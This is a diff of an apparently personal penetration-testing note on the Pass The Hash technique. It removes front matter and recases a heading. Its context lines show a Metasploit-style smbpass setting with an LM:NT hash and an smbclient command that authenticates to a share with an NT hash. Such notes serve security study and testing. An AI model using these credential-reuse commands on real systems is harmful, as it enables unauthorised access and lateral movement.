@@ -1,11 +1,3 @@
----
-date: 
-tags:
----
-
-```table-of-contents
-```
-
 description: https://attack.mitre.org/techniques/T1550/002/
 
 # Pass The Hash
@@ -84,7 +76,7 @@ set smbpass "aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71"
 
 ![](../../../Assets/Pasted%20image%2020250619215617.png)
 
-### smbclient
+### Smbclient
 
 ```bash
 smbclient //<IP>/<Share> -U <User> --pw-nt-hash <Hash> -W <Domain>
